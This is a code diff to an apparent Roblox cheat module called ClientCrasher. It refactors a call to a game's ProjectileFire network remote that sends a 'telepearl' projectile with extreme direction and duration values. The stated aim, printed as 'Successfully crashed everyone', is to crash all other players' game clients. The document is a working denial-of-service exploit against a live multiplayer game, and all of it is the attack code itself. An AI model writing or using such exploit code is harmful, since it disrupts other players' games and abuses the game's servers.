@@ -10,6 +10,28 @@ task.spawn(function()
     projectileRemote = replicated.rbxts_include.node_modules["@rbxts"].net.out._NetManaged.ProjectileFire
 end)
 
+local rayCheck = RaycastParams.new()
+rayCheck.RespectCanCollide = true
+
+local function firePearl(pos, dir, item)
+    local threwPearl = projectileRemote:CallServerAsync(
+        item,
+        'telepearl',
+        'telepearl',
+        pos,
+        pos,
+        dir,
+        '9U3ZAYNE',
+        {
+            shotId = '2XKTHZ4I',
+            drawDurationSec = 9e9
+        },
+        workspace:GetServerTimeNow()
+    )
+
+    return threwPearl
+end
+
 ClientCrasher.Run = function()
     ClientCrasher.Enabled = not ClientCrasher.Enabled
 
@@ -35,29 +57,26 @@ ClientCrasher.Run = function()
                 return
             end
 
-            -- Crash
-            local success = pcall(function()
-                projectileRemote:CallServerAsync(
-                    pearl,
-                    'telepearl',
-                    'telepearl',
-                    root.Position,
-                    root.Position,
-                    Vector3.new(9e7, 9e9, 9e6),
-                    '9U3ZAYNE',
-                    {
-                        shotId = '2XKTHZ4I',
-                        drawDurationSec = 9e9
-                    },
-                    workspace:GetServerTimeNow()
-                )
-            end)
+            rayCheck.FilterDescendantsInstances = {game.Players.LocalPlayer.Character}
+            local ray = workspace:Raycast(root.Position, Vector3.new(0, 500, 0), rayCheck)
+            if ray then
+                print("ClientCrasher: You are under a block")
+                ClientCrasher.Enabled = false
+                return
+            end
 
-            print("ClientCrasher: " .. (success and "Crashed everyone" or "Failed to crash"))
+            print("ClientCrasher: Crashing please wait...")
+
+            local s = firePearl(
+                root.Position,
+                Vector3.new(9e7, 9e9, 9e6),
+                pearl
+            )
+
+            ClientCrasher.Enabled = false
+
+            print("ClientCrasher: " .. (s and "Successfully crashed everyone" or "Failed to crash, please retry."))
         end
-
-        -- Auto disable
-        ClientCrasher.Enabled = false
     else
         print("❌ ClientCrasher Disabled")
     end
